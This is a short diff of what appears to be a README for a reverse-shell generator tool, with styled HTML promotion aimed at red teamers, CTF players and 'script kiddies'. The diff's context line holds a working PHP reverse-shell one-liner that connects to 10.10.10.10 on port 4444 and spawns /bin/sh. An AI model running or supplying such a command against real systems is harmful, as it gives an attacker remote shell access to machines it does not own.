@@ -30,8 +30,7 @@ php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 [r] Run  •  [SPACE] Details  •  [ENTER] Copy  •  [q] Quit
 ```
-
-Why every red teamer, CTF player & script kiddie is installing this right now..!
+<br> <br>
 <div style="background: linear-gradient(135deg, #000, #11002a); padding: 25px; border-radius: 15px; border: 2px solid #00ff00; box-shadow: 0 0 30px #00ff0044; max-width: 800px;">
 
  <span style="color:#00ff00; text-shadow: 0 0 10px #0f0;">Why every red teamer, CTF player & script kiddie is installing this right now..! 2025</span>
